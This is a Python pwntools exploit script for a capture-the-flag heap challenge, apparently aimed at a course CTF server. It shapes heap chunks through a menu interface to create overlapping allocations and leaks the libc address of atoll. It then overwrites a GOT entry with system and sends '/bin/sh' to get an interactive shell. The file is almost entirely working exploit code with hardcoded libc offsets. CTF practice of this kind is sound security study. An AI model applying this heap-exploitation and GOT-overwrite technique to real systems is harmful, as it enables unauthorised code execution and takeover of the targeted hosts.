from pwn import *
import sys
context.arch = 'amd64'

print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('csie.ctf.tw',10143)
else:
    r = remote('localhost',8888)
#r.interactive()
def allocate(size,data):
    r.sendline('1')
    r.recvuntil('Size')
    r.send(str(size))
    r.recvuntil('Content')
    r.send(data)
def free(idx):
    r.sendline('2')
    r.recvuntil('Index')
    r.sendline(str(idx))

def add(magic):
    r.sendline('3')
    r.recvuntil('magic')
    r.send(magic)
def show():
    r.sendline('4')
    r.recvuntil('Magic: ')
def edit(magic):
    r.sendline('5')
    r.recvuntil('magic')
    r.send(magic)




allocate(0x38, 'A'*0x38) #0
allocate(0x160, 'B'*0xf0 + p64(0x100)) #1
allocate(0xf0, 'C'*8) #2
free(1)
free(0)
allocate(0x38,'x'*0x38) #0
allocate(0x90,'x'*0x10) #1
add(p64(5))
free(1)
free(2)
allocate(0x110,'x'*0xa0 + p64(0x602058)) #1
show()
atoll = r.recvuntil('#')[:-1]
atoll = u64(atoll.ljust(8,'\0'))
print hex(atoll)
libc = atoll - 0x36eb0
system = libc + 0x45390
edit(p64(system))
'''
allocate(0x80, '12345678')  #3
allocate(0x50, 'B'*8)       #4
system = 0x4007d0 
allocate(0x50, 'x'*14 + p64(system)) 
'''
r.send('/bin/sh')
r.interactive()
